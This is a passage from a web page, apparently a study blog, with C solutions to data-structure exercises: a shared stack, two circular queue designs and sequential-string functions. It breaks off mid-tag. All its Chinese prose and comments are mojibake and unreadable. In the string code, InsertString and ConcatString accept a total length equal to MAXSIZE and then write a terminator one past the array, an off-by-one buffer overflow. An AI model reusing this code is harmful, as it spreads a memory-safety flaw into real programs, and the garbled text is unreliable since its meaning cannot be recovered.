<span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    SharedStack stack;<br>    <span class="hljs-built_in">InitStack</span>(&amp;stack);<br><br>    <span class="hljs-comment">// æµ‹è¯•s1çš„å…¥æ ˆ</span><br>    <span class="hljs-built_in">Push</span>(&amp;stack, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">Push</span>(&amp;stack, <span class="hljs-number">20</span>, <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">Push</span>(&amp;stack, <span class="hljs-number">30</span>, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// æµ‹è¯•s2çš„å…¥æ ˆ</span><br>    <span class="hljs-built_in">Push</span>(&amp;stack, <span class="hljs-number">100</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">Push</span>(&amp;stack, <span class="hljs-number">200</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">Push</span>(&amp;stack, <span class="hljs-number">300</span>, <span class="hljs-number">2</span>);<br><br>    <span class="hljs-comment">// æµ‹è¯•s1çš„å‡ºæ ˆ</span><br>    <span class="hljs-type">int</span> value;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ ˆs1å‡ºæ ˆå…ƒç´ : &quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Pop</span>(&amp;stack, &amp;value, <span class="hljs-number">1</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, value);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    <span class="hljs-comment">// æµ‹è¯•s2çš„å‡ºæ ˆ</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ ˆs2å‡ºæ ˆå…ƒç´ : &quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Pop</span>(&amp;stack, &amp;value, <span class="hljs-number">2</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, value);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å‡è®¾ç”¨ä¸€ä¸ªå¾ªç¯å•é“¾è¡¨æ¥è¡¨ç¤ºå¾ªç¯é˜Ÿåˆ—ï¼Œè¯¥é˜Ÿåˆ—åªè®¾ä¸€ä¸ªé˜Ÿå°¾æŒ‡é’ˆï¼Œä¸è®¾é˜Ÿå¤´æŒ‡é’ˆç¼–å†™å¦‚ä¸‹å‡½æ•°:<br>(1)å‘å¾ªç¯é“¾é˜Ÿä¸­æ’å…¥ä¸€ä¸ªå…ƒç´ ä¸ºxçš„ç»“ç‚¹ã€‚<br>(2)ä»å¾ªç¯é“¾é˜Ÿä¸­åˆ é™¤ä¸€ä¸ªç»“ç‚¹ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-comment">// å®šä¹‰èŠ‚ç‚¹ç»“æ„</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> &#123;<br>    <span class="hljs-type">int</span> data;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *next;<br>&#125; Node;<br><br><span class="hljs-comment">// å®šä¹‰å¾ªç¯é“¾é˜Ÿåˆ—ï¼Œä»…åŒ…å«é˜Ÿå°¾æŒ‡é’ˆ</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    Node *rear;  <span class="hljs-comment">// é˜Ÿå°¾æŒ‡é’ˆ</span><br>&#125; CircularQueue;<br><br><span class="hljs-comment">// åˆå§‹åŒ–å¾ªç¯é˜Ÿåˆ—</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InitQueue</span><span class="hljs-params">(CircularQueue *queue)</span> </span>&#123;<br>    queue-&gt;rear = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// é˜Ÿå°¾æŒ‡é’ˆåˆå§‹åŒ–ä¸ºç©º</span><br>&#125;<br><br><span class="hljs-comment">// æ’å…¥å…ƒç´ xï¼ˆå…¥é˜Ÿï¼‰æˆ–åˆ é™¤å…ƒç´ ï¼ˆå‡ºé˜Ÿï¼‰</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QueueOperation</span><span class="hljs-params">(CircularQueue *queue, <span class="hljs-type">int</span> *value, <span class="hljs-type">int</span> isEnqueue)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (isEnqueue) &#123;  <span class="hljs-comment">// å…¥é˜Ÿæ“ä½œ</span><br>        Node *newNode = (Node *)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Node));<br>        <span class="hljs-keyword">if</span> (!newNode) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å†…å­˜åˆ†é…å¤±è´¥\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        newNode-&gt;data = *value;<br><br>        <span class="hljs-keyword">if</span> (!queue-&gt;rear) &#123;  <span class="hljs-comment">// é˜Ÿåˆ—ä¸ºç©º</span><br>            newNode-&gt;next = newNode;  <span class="hljs-comment">// è‡ªç¯</span><br>            queue-&gt;rear = newNode;    <span class="hljs-comment">// é˜Ÿå°¾æŒ‡å‘æ–°èŠ‚ç‚¹</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;  <span class="hljs-comment">// é˜Ÿåˆ—ä¸ä¸ºç©º</span><br>            newNode-&gt;next = queue-&gt;rear-&gt;next;  <span class="hljs-comment">// æ–°èŠ‚ç‚¹çš„nextæŒ‡å‘é˜Ÿå¤´</span><br>            queue-&gt;rear-&gt;next = newNode;        <span class="hljs-comment">// é˜Ÿå°¾çš„nextæŒ‡å‘æ–°èŠ‚ç‚¹</span><br>            queue-&gt;rear = newNode;              <span class="hljs-comment">// æ›´æ–°é˜Ÿå°¾æŒ‡é’ˆ</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;  <span class="hljs-comment">// å…¥é˜ŸæˆåŠŸ</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;  <span class="hljs-comment">// å‡ºé˜Ÿæ“ä½œ</span><br>        <span class="hljs-keyword">if</span> (!queue-&gt;rear) &#123;  <span class="hljs-comment">// é˜Ÿåˆ—ä¸ºç©º</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é˜Ÿåˆ—ä¸ºç©ºï¼Œæ— æ³•å‡ºé˜Ÿ\n&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <br>        Node *temp = queue-&gt;rear-&gt;next;  <span class="hljs-comment">// é˜Ÿå¤´èŠ‚ç‚¹</span><br>        *value = temp-&gt;data;             <span class="hljs-comment">// è·å–é˜Ÿå¤´å…ƒç´ </span><br>        <br>        <span class="hljs-keyword">if</span> (queue-&gt;rear == temp) &#123;  <span class="hljs-comment">// é˜Ÿåˆ—ä»…æœ‰ä¸€ä¸ªèŠ‚ç‚¹</span><br>            queue-&gt;rear = <span class="hljs-literal">NULL</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;  <span class="hljs-comment">// é˜Ÿåˆ—æœ‰å¤šä¸ªèŠ‚ç‚¹</span><br>            queue-&gt;rear-&gt;next = temp-&gt;next;  <span class="hljs-comment">// é˜Ÿå°¾çš„nextæŒ‡å‘æ–°çš„é˜Ÿå¤´</span><br>        &#125;<br>        <span class="hljs-built_in">free</span>(temp);  <span class="hljs-comment">// é‡Šæ”¾æ—§çš„é˜Ÿå¤´èŠ‚ç‚¹</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    <span class="hljs-comment">// å‡ºé˜ŸæˆåŠŸ</span><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    CircularQueue queue;<br>    <span class="hljs-built_in">InitQueue</span>(&amp;queue);<br><br>    <span class="hljs-comment">// å…¥é˜Ÿæ“ä½œ</span><br>    <span class="hljs-type">int</span> value = <span class="hljs-number">10</span>;<br>    <span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">1</span>);<br>    value = <span class="hljs-number">20</span>;<br>    <span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">1</span>);<br>    value = <span class="hljs-number">30</span>;<br>    <span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// å‡ºé˜Ÿæ“ä½œ</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å‡ºé˜Ÿå…ƒç´ : %d\n&quot;</span>, value);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å‡ºé˜Ÿå…ƒç´ : %d\n&quot;</span>, value);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å‡ºé˜Ÿå…ƒç´ : %d\n&quot;</span>, value);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é˜Ÿåˆ—ä¸ºç©ºï¼Œæ— æ³•å‡ºé˜Ÿ\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å‡è®¾å°†å¾ªç¯é˜Ÿåˆ—å®šä¹‰ä¸º:ä»¥åŸŸå˜é‡rear å’Œ length åˆ†åˆ«è¡¨ç¤ºå¾ªç¯é˜Ÿåˆ—ä¸­é˜Ÿå°¾å…ƒç´ çš„ä½å’Œå†…å«å…ƒç´ çš„ä¸ªæ•°ã€‚è¯•ç»™å‡ºå¾ªç¯é˜Ÿåˆ—çš„é˜Ÿæ»¡æ¡ä»¶ï¼Œå¹¶å†™å‡ºç›¸åº”çš„å…¥é˜Ÿå’Œå‡ºé˜Ÿçš„ç®—æ³•ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 100 <span class="hljs-comment">// é˜Ÿåˆ—çš„æœ€å¤§å®¹é‡</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">int</span> data[MAXSIZE];  <span class="hljs-comment">// å­˜å‚¨é˜Ÿåˆ—å…ƒç´ çš„æ•°ç»„</span><br>    <span class="hljs-type">int</span> rear;           <span class="hljs-comment">// é˜Ÿå°¾æŒ‡é’ˆ</span><br>    <span class="hljs-type">int</span> length;         <span class="hljs-comment">// é˜Ÿåˆ—ä¸­å…ƒç´ çš„ä¸ªæ•°</span><br>&#125; CircularQueue;<br><br><span class="hljs-comment">// åˆå§‹åŒ–å¾ªç¯é˜Ÿåˆ—</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InitQueue</span><span class="hljs-params">(CircularQueue *queue)</span> </span>&#123;<br>    queue-&gt;rear = <span class="hljs-number">-1</span>;      <span class="hljs-comment">// åˆå§‹æ—¶ï¼Œé˜Ÿå°¾æŒ‡é’ˆä¸º -1 è¡¨ç¤ºç©ºé˜Ÿåˆ—</span><br>    queue-&gt;length = <span class="hljs-number">0</span>;     <span class="hljs-comment">// åˆå§‹æ—¶ï¼Œé˜Ÿåˆ—ä¸­æ²¡æœ‰å…ƒç´ </span><br>&#125;<br><br><span class="hljs-comment">// é˜Ÿåˆ—æ“ä½œï¼šå…¥é˜Ÿï¼ˆisEnqueueä¸º1ï¼‰å’Œå‡ºé˜Ÿï¼ˆisEnqueueä¸º0ï¼‰</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QueueOperation</span><span class="hljs-params">(CircularQueue *queue, <span class="hljs-type">int</span> *value, <span class="hljs-type">int</span> isEnqueue)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (isEnqueue) &#123; <span class="hljs-comment">// å…¥é˜Ÿæ“ä½œ</span><br>        <span class="hljs-keyword">if</span> (queue-&gt;length == MAXSIZE) &#123; <span class="hljs-comment">// é˜Ÿæ»¡æ¡ä»¶</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é˜Ÿåˆ—å·²æ»¡ï¼Œæ— æ³•å…¥é˜Ÿ\n&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        queue-&gt;rear = (queue-&gt;rear + <span class="hljs-number">1</span>) % MAXSIZE; <span class="hljs-comment">// æ›´æ–°é˜Ÿå°¾ä½ç½®</span><br>        queue-&gt;data[queue-&gt;rear] = *value;         <span class="hljs-comment">// åœ¨é˜Ÿå°¾æ’å…¥æ–°å…ƒç´ </span><br>        queue-&gt;length++;                           <span class="hljs-comment">// å¢åŠ é˜Ÿåˆ—é•¿åº¦</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// å‡ºé˜Ÿæ“ä½œ</span><br>        <span class="hljs-keyword">if</span> (queue-&gt;length == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// é˜Ÿç©ºæ¡ä»¶</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é˜Ÿåˆ—ä¸ºç©ºï¼Œæ— æ³•å‡ºé˜Ÿ\n&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-type">int</span> front = (queue-&gt;rear - queue-&gt;length + <span class="hljs-number">1</span> + MAXSIZE) % MAXSIZE; <span class="hljs-comment">// è®¡ç®—é˜Ÿå¤´ä½ç½®</span><br>        *value = queue-&gt;data[front];   <span class="hljs-comment">// è·å–é˜Ÿå¤´å…ƒç´ </span><br>        queue-&gt;length--;               <span class="hljs-comment">// å‡å°‘é˜Ÿåˆ—é•¿åº¦</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    CircularQueue queue;<br>    <span class="hljs-built_in">InitQueue</span>(&amp;queue);<br><br>    <span class="hljs-comment">// å…¥é˜Ÿæ“ä½œ</span><br>    <span class="hljs-type">int</span> value = <span class="hljs-number">10</span>;<br>    <span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">1</span>);<br>    value = <span class="hljs-number">20</span>;<br>    <span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">1</span>);<br>    value = <span class="hljs-number">30</span>;<br>    <span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// å‡ºé˜Ÿæ“ä½œ</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å‡ºé˜Ÿå…ƒç´ : %d\n&quot;</span>, value);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å‡ºé˜Ÿå…ƒç´ : %d\n&quot;</span>, value);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å‡ºé˜Ÿå…ƒç´ : %d\n&quot;</span>, value);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">QueueOperation</span>(&amp;queue, &amp;value, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é˜Ÿåˆ—ä¸ºç©ºï¼Œæ— æ³•å‡ºé˜Ÿ\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="å­—ç¬¦ä¸²"><a href="#å­—ç¬¦ä¸²" class="headerlink" title="å­—ç¬¦ä¸²"></a>å­—ç¬¦ä¸²</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 100 <span class="hljs-comment">// é¡ºåºä¸²çš„æœ€å¤§å®¹é‡</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">char</span> data[MAXSIZE]; <span class="hljs-comment">// å­˜å‚¨ç©ºé—´</span><br>    <span class="hljs-type">int</span> length;         <span class="hljs-comment">// å®é™…é•¿åº¦</span><br>&#125; SString;<br><br><span class="hljs-comment">// åˆå§‹åŒ–é¡ºåºä¸²</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InitString</span><span class="hljs-params">(SString *str)</span> </span>&#123;<br>    str-&gt;length = <span class="hljs-number">0</span>;<br>    str-&gt;data[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">// æ±‚å­ä¸²æ“ä½œï¼Œè·å– str ä¸­ä» pos å¼€å§‹é•¿åº¦ä¸º len çš„å­ä¸²ï¼Œç»“æœä¿å­˜åœ¨ substr ä¸­</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">SubString</span><span class="hljs-params">(SString *str, SString *substr, <span class="hljs-type">int</span> pos, <span class="hljs-type">int</span> len)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (pos &lt; <span class="hljs-number">0</span> || pos &gt;= str-&gt;length || len &lt; <span class="hljs-number">0</span> || pos + len &gt; str-&gt;length) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ä½ç½®æˆ–é•¿åº¦ä¸åˆæ³•\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        substr-&gt;data[i] = str-&gt;data[pos + i];<br>    &#125;<br>    substr-&gt;data[len] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    substr-&gt;length = len;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// æ’å…¥å­ä¸²æ“ä½œï¼Œå°† substr æ’å…¥åˆ° str çš„ pos ä½ç½®</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">InsertString</span><span class="hljs-params">(SString *str, <span class="hljs-type">int</span> pos, SString *substr)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (pos &lt; <span class="hljs-number">0</span> || pos &gt; str-&gt;length || str-&gt;length + substr-&gt;length &gt; MAXSIZE) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ’å…¥ä½ç½®æˆ–é•¿åº¦ä¸åˆæ³•\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// å°†åŸä¸²ä»æ’å…¥ç‚¹å‘åç§»åŠ¨</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = str-&gt;length - <span class="hljs-number">1</span>; i &gt;= pos; i--) &#123;<br>        str-&gt;data[i + substr-&gt;length] = str-&gt;data[i];<br>    &#125;<br>    <span class="hljs-comment">// æ’å…¥å­ä¸²</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; substr-&gt;length; i++) &#123;<br>        str-&gt;data[pos + i] = substr-&gt;data[i];<br>    &#125;<br>    str-&gt;length += substr-&gt;length;<br>    str-&gt;data[str-&gt;length] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// åˆ é™¤å­ä¸²æ“ä½œï¼Œä» str çš„ pos ä½ç½®å¼€å§‹åˆ é™¤ len é•¿åº¦çš„å­—ç¬¦</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">DeleteString</span><span class="hljs-params">(SString *str, <span class="hljs-type">int</span> pos, <span class="hljs-type">int</span> len)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (pos &lt; <span class="hljs-number">0</span> || pos &gt;= str-&gt;length || len &lt; <span class="hljs-number">0</span> || pos + len &gt; str-&gt;length) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;åˆ é™¤ä½ç½®æˆ–é•¿åº¦ä¸åˆæ³•\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// å°†åç»­çš„å­—ç¬¦å‰ç§»</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = pos + len; i &lt; str-&gt;length; i++) &#123;<br>        str-&gt;data[i - len] = str-&gt;data[i];<br>    &#125;<br>    str-&gt;length -= len;<br>    str-&gt;data[str-&gt;length] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// ä¸²è¿æ¥æ“ä½œï¼Œå°† str1 å’Œ str2 è¿æ¥æˆ result</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">ConcatString</span><span class="hljs-params">(SString *result, SString *str1, SString *str2)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (str1-&gt;length + str2-&gt;length &gt; MAXSIZE) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;è¿æ¥åçš„å­—ç¬¦ä¸²è¿‡é•¿ï¼Œæ— æ³•è¿æ¥\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">strcpy</span>(result-&gt;data, str1-&gt;data);<br>    <span 